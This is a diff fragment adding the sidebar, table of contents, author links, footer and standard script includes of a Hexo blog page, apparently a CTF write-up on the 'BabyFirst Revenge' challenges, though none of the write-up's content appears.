+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyFirst-Revenge"><span class="nav-number">1.</span> <span class="nav-text">BabyFirst Revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">1.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E8%A7%A3%E7%AD%94"><span class="nav-number">1.4.</span> <span class="nav-text">更多解答</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyFirst-Revenge-v2"><span class="nav-number">2.</span> <span class="nav-text">BabyFirst Revenge v2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-1"><span class="nav-number">2.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95-1"><span class="nav-number">2.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E8%A7%A3%E7%AD%94-1"><span class="nav-number">2.4.</span> <span class="nav-text">更多解答</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
